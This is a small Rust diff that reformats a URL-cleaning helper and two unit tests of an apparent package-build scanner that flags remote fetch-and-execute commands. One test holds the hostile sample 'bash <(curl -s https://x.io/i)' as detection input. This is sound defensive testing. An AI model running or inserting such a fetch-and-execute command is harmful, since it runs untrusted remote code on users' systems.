@@ -37,7 +37,8 @@ lazy_static! {
 
 /// Trim trailing shell punctuation a URL regex may capture.
 fn clean_url(u: &str) -> String {
-    u.trim_end_matches([';', '&', ',', '.', '\\', '}']).to_string()
+    u.trim_end_matches([';', '&', ',', '.', '\\', '}'])
+        .to_string()
 }
 
 /// Detects remote fetch-and-execute and extracts the external URL(s).
@@ -139,7 +140,11 @@ mod tests {
     #[test]
     fn detects_process_substitution() {
         let a = RemoteExecAnalyzer::new();
-        let f = a.scan("bash <(curl -s https://x.io/i)", Path::new("PKGBUILD"), false);
+        let f = a.scan(
+            "bash <(curl -s https://x.io/i)",
+            Path::new("PKGBUILD"),
+            false,
+        );
         assert!(f.iter().any(|x| x.id == "EXEC-REMOTE"));
     }
 
@@ -147,7 +152,11 @@ mod tests {
     fn ignores_plain_download_without_exec() {
         // A source download (no exec) must not be flagged here; that's normal.
         let a = RemoteExecAnalyzer::new();
-        let f = a.scan("curl -O https://example.com/src.tar.gz", Path::new("PKGBUILD"), false);
+        let f = a.scan(
+            "curl -O https://example.com/src.tar.gz",
+            Path::new("PKGBUILD"),
+            false,
+        );
         assert!(f.is_empty());
     }
 }
